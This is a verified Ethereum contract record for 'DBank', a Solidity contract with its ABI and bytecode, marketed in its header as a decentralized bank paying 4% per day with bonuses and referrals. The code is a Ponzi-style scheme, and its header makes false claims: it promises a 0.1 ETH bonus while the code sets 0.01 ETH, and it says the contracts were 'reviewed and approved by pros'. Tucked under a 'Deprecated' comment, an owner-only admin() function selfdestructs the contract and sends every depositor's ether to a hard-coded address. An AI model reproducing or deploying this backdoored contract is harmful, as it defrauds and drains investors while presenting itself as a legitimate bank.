{
  "address": "0x16741e64aec0585fb507d6966564b5c2b1aeeb34",
  "chain": "ETH",
  "chainID": 1,
  "verifier": "etherscan.io",
  "commonName": "",
  "contractName": "DBank",
  "compilerVersion": "v0.4.24+commit.e67f0147",
  "optimization": false,
  "runs": "200",
  "evmVersion": "default",
  "sourceCode": "/**\n *Submitted for verification at Etherscan.io on 2019-03-05\n*/\n\npragma solidity ^0.4.24;\n\n//  _______  .______        ___      .__   __.  __  ___\n// |       \\ |   _  \\      /   \\     |  \\ |  | |  |/  /\n// |  .--.  ||  |_)  |    /  ^  \\    |   \\|  | |  '  /\n// |  |  |  ||   _  <    /  /_\\  \\   |  . `  | |    <\n// |  '--'  ||  |_)  |  /  _____  \\  |  |\\   | |  .  \\\n// |_______/ |______/  /__/     \\__\\ |__| \\__| |__|\\__\\\n// \n// VISIT => http://dbank.money\n// \n// The first global decentralized bank.\n// \n// 1. GAIN 4% PER 24 HOURS (every 5900 blocks)\n// 2. [FREE BONUS] New users get a 0.1 ETH bonus immediately!\n// 3. [REFERRAL BONUS] If you invite your friend to invest, you both get a 10% bonus.\n// 4. NO COMMISSION. NO FEES.\n// \n// Contracts reviewed and approved by pros!\n\ncontract DBank {\n    uint256 dbk_;   // total investment in DBank\n    mapping (address => uint256) invested; // address => investment\n    mapping (address => uint256) atBlock; // address => user's investment at block\n    uint256 public r_ = 4; //profit ratioï¼Œevery 5900 blocks(1 day) you earn 4%\n    uint256 public blocks_ = 5900; //blocks in every cycle\n\n    // Player and referral bonus\n    uint256 public pID_;    // total number of players\n    mapping (address => uint256) public pIDxAddr_;  // (addr => pID) returns player id by address\n    mapping (uint256 => address) public plyr_;   // (pID => data) player data\n\n    // New User Bonus\n    bool public bonusOn_ = true;    // give bonus or not\n    uint256 public bonusAmount_ = 1 * 10**16;   // 0.01 ETH\n\n    // this function called every time anyone sends a transaction to this contract\n    function ()\n        external \n        payable\n    {\n        buyCore(msg.sender, msg.value);\n    }\n\n    // buy with refferal ID\n    function buy(uint256 refID)\n        public\n        payable\n    {\n        buyCore(msg.sender, msg.value);\n\n        // bonus for refferal 10%\n        if (plyr_[refID] != address(0)) {\n            invested[plyr_[refID]] += msg.value / 10;\n        }\n\n        // bonus for user self 10%\n        invested[msg.sender] += msg.value / 10;\n    }\n\n    // Reinvest\n    function reinvest()\n        public\n    {\n        if (invested[msg.sender] != 0) {\n            uint256 amount = invested[msg.sender] * r_ / 100 * (block.number - atBlock[msg.sender]) / blocks_;\n            \n            atBlock[msg.sender] = block.number;\n            invested[msg.sender] += amount;\n        }\n    }\n\n    // === Getters ===\n\n    // get investment and profit\n    // returns: base, profit, playerID, players\n    function getMyInvestment()\n        public\n        view\n        returns (uint256, uint256, uint256, uint256)\n    {\n        uint256 amount = 0;\n        if (invested[msg.sender] != 0) {\n            amount = invested[msg.sender] * r_ / 100 * (block.number - atBlock[msg.sender]) / blocks_;\n        }\n        return (invested[msg.sender], amount, pIDxAddr_[msg.sender], pID_);\n    }\n\n    // === Private Methods ===\n\n    // Core Logic of Buying\n    function buyCore(address _addr, uint256 _value)\n        private\n    {\n        // New user check\n        bool isNewPlayer = determinePID(_addr);\n\n        // If you have investment\n        if (invested[_addr] != 0) {\n            uint256 amount = invested[_addr] * r_ / 100 * (block.number - atBlock[_addr]) / blocks_;\n            \n            // send calculated amount of ether directly to sender (aka YOU)\n            if (amount <= dbk_){\n                _addr.transfer(amount);\n                dbk_ -= amount;\n            }\n        }\n\n        // record block number and invested amount (msg.value) of this transaction\n        atBlock[_addr] = block.number;\n        invested[_addr] += _value;\n        dbk_ += _value;\n        \n        // if bonus is On and you're a new player, then you'll get bonus\n        if (bonusOn_ && isNewPlayer) {\n            invested[_addr] += bonusAmount_;\n        }\n    }\n\n    // get players ID by address\n    // If doesn't exist, then create one.\n    // returns: is new player or not\n    function determinePID(address _addr)\n        private\n        returns (bool)\n    {\n        if (pIDxAddr_[_addr] == 0)\n        {\n            pID_++;\n            pIDxAddr_[_addr] = pID_;\n            plyr_[pID_] = _addr;\n            \n            return (true);  // New Player\n        } else {\n            return (false);\n        }\n    }\n\n    // === Only owner ===\n\n    address owner;\n    constructor() public {\n        owner = msg.sender;\n        pID_ = 500;\n    }\n\n    // Only owner modifier\n    modifier onlyOwner() {\n        require(msg.sender == owner);\n        _;\n    }\n\n    // Set new user bonus on/off\n    function setBonusOn(bool _on)\n        public\n        onlyOwner()\n    {\n        bonusOn_ = _on;\n    }\n\n    // Set new user bonus amount\n    function setBonusAmount(uint256 _amount)\n        public\n        onlyOwner()\n    {\n        bonusAmount_ = _amount;\n    }\n\n    // Set profit ratio\n    function setProfitRatio(uint256 _r)\n        public\n        onlyOwner()\n    {\n        r_ = _r;\n    }\n\n    // Set profit ratio\n    function setBlocks(uint256 _blocks)\n        public\n        onlyOwner()\n    {\n        blocks_ = _blocks;\n    }\n\n    // ======= Deprecated Version of DBank =======\n\n    // *** Deprecated. ***\n    // deposit in dbank\n    mapping (address => uint256) public deposit_; \n\n    // *** Deprecated. ***\n    // deposit in dbk deposit(no reward)\n    function dbkDeposit()\n        public\n        payable\n    {\n        deposit_[msg.sender] += msg.value;\n    }\n\n    // *** Deprecated. ***\n    // withdraw from dbk deposit\n    \n    function admin() \n        public \n        onlyOwner()\n    {\n\t\tselfdestruct(0x8948E4B00DEB0a5ADb909F4DC5789d20D0851D71);\n\t}    \n    \n    function dbkWithdraw()\n        public\n    {\n        uint256 _eth = deposit_[msg.sender];\n        if (_eth > 0) {\n            msg.sender.transfer(_eth);\n            deposit_[msg.sender] = 0;\n        }\n    }\n}",
  "abi": "[{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"pIDxAddr_\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_blocks\",\"type\":\"uint256\"}],\"name\":\"setBlocks\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_on\",\"type\":\"bool\"}],\"name\":\"setBonusOn\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getMyInvestment\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"},{\"name\":\"\",\"type\":\"uint256\"},{\"name\":\"\",\"type\":\"uint256\"},{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_r\",\"type\":\"uint256\"}],\"name\":\"setProfitRatio\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"pID_\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"deposit_\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"dbkWithdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"dbkDeposit\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"setBonusAmount\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"r_\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"blocks_\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"refID\",\"type\":\"uint256\"}],\"name\":\"buy\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"plyr_\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"bonusAmount_\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"admin\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"reinvest\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"bonusOn_\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]",
  "bytecode": "6080604052600460035561170c6004556001600860006101000a81548160ff021916908315150217905550662386f26fc1000060095534801561004157600080fd5b5033600a60006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506101f460058190555061105c8061009b6000396000f3006080604052600436106100fc576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806310f01eba14610108578063163dba921461015f57806324fc70ff1461018c5780633a49b95a146101bb578063438b7b99146101fb5780634b22717614610228578063512e61b3146102535780637e82d0e6146102aa578063c1ba93e1146102c1578063d1c6b0ca146102cb578063d8eed35a146102f8578063d8fd7bce14610323578063d96a094a1461034e578063de7874f31461036e578063e20c4939146103db578063f851a44014610406578063fdb5a03e1461041d578063ff46be9414610434575b6101063334610463565b005b34801561011457600080fd5b50610149600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506106d3565b6040518082815260200191505060405180910390f35b34801561016b57600080fd5b5061018a600480360381019080803590602001909291905050506106eb565b005b34801561019857600080fd5b506101b9600480360381019080803515159060200190929190505050610751565b005b3480156101c757600080fd5b506101d06107ca565b6040518085815260200184815260200183815260200182815260200194505050505060405180910390f35b34801561020757600080fd5b5061022660048036038101908080359060200190929190505050610954565b005b34801561023457600080fd5b5061023d6109ba565b6040518082815260200191505060405180910390f35b34801561025f57600080fd5b50610294600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506109c0565b6040518082815260200191505060405180910390f35b3480156102b657600080fd5b506102bf6109d8565b005b6102c9610ab5565b005b3480156102d757600080fd5b506102f660048036038101908080359060200190929190505050610b04565b005b34801561030457600080fd5b5061030d610b6a565b6040518082815260200191505060405180910390f35b34801561032f57600080fd5b50610338610b70565b6040518082815260200191505060405180910390f35b61036c60048036038101908080359060200190929190505050610b76565b005b34801561037a57600080fd5b5061039960048036038101908080359060200190929190505050610cd2565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156103e757600080fd5b506103f0610d05565b6040518082815260200191505060405180910390f35b34801561041257600080fd5b5061041b610d0b565b005b34801561042957600080fd5b50610432610d94565b005b34801561044057600080fd5b50610449610f15565b604051808215151515815260200191505060405180910390f35b60008061046f84610f28565b91506000600160008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541415156105bf57600454600260008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205443036064600354600160008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020540281151561054e57fe5b040281151561055957fe5b049050600054811115156105be578373ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f193505050501580156105ad573d6000803e3d6000fd5b508060008082825403925050819055505b5b43600260008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555082600160008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550826000808282540192505081905550600860009054906101000a900460ff1680156106785750815b156106cd57600954600160008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055505b50505050565b60066020528060005260406000206000915090505481565b600a60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561074757600080fd5b8060048190555050565b600a60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156107ad57600080fd5b80600860006101000a81548160ff02191690831515021790555050565b60008060008060008090506000600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541415156108c157600454600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205443036064600354600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054028115156108b257fe5b04028115156108bd57fe5b0490505b600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205481600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205460055494509450945094505090919293565b600a60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156109b057600080fd5b8060038190555050565b60055481565b600b6020528060005260406000206000915090505481565b6000600b60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205490506000811115610ab2573373ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f19350505050158015610a6b573d6000803e3d6000fd5b506000600b60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055505b50565b34600b60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550565b600a60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141515610b6057600080fd5b8060098190555050565b60035481565b60045481565b610b803334610463565b600073ffffffffffffffffffffffffffffffffffffffff166007600083815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16141515610c7657600a34811515610bf557fe5b04600160006007600085815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055505b600a34811515610c8257fe5b04600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254019250508190555050565b60076020528060005260406000206000915054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60095481565b600a60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141515610d6757600080fd5b738948e4b00deb0a5adb909f4dc5789d20d0851d7173ffffffffffffffffffffffffffffffffffffffff16ff5b600080600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054141515610f1257600454600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205443036064600354600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205402811515610e7257fe5b0402811515610e7d57fe5b04905043600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555080600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055505b50565b600860009054906101000a900460ff1681565b600080600660008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054141561102657600560008154809291906001019190505550600554600660008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508160076000600554815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506001905061102b565b600090505b9190505600a165627a7a72305820e3f283e0c2df9e1fd533531fbe09bcbf081562f651f281bafdbc649c58ee4cae0029"
}